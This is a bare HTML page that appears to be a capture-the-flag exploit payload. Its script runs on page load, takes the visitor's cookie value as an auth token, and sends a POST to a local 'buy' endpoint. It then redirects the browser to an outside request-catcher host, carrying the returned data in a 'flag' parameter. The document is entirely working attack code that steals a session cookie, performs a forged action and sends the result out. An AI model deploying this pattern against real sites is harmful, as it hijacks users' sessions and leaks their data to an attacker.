<!DOCTYPE html>
<html>
<body>
<script>
fetch('http://localhost:3000/4/buy', {
    method: 'POST',
    headers: {
        'token': document.cookie.split('=')[1],
        'Content-Type': 'application/json'
    }
})
.then(r => r.json())
.then(d => {
    location.href = 'https://ptmdzqh.request.dreamhack.games/?flag=' + encodeURIComponent(d.data);
});
</script>
</body>
</html>
